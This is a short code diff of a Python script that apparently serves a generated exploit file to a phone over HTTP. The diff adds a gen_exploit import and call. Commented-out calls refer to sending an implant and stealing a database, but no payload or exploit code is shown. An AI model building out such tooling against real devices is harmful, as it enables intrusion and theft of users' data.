@@ -1,6 +1,7 @@
 import http.server, socket, sqlite3, json, requests, datetime, os
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from Crypto.Cipher import AES
+import gen_exploit
 
 # uses port 12345, ensure later processes use a different port
 # TODO move the desired exploit file into this directory so it will be forwarded to the phone when GET request received
@@ -79,6 +80,7 @@ def connect_to_db(filepath):
 
 if __name__ == "__main__":
     # host = 'localhost'
+    gen_exploit.gen_exploit()
     listen_for_phone_and_send_exploit_file()
     # send_implant(host)
     # steal_database()
